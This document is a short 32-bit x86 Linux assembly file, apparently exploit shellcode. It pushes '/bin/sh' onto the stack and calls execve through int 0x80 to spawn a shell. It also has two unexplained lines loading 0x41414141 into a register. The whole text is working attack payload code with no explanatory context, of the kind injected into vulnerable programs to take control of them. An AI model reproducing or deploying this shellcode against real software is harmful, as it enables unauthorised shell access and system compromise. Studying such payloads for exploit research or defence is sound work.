section .text 
global _start 

_start: 

    xor eax, eax 
    ;/bin/sh
    push eax
    push   0x68732f
    push   0x6e69622f

    
    mov ebx, esp
    push eax 
    push ebx 
    mov ecx,esp
    mov eax, 0xb
    mov ebp, 0x41414141
    mov ebp, 0x41414141
    int 0x80

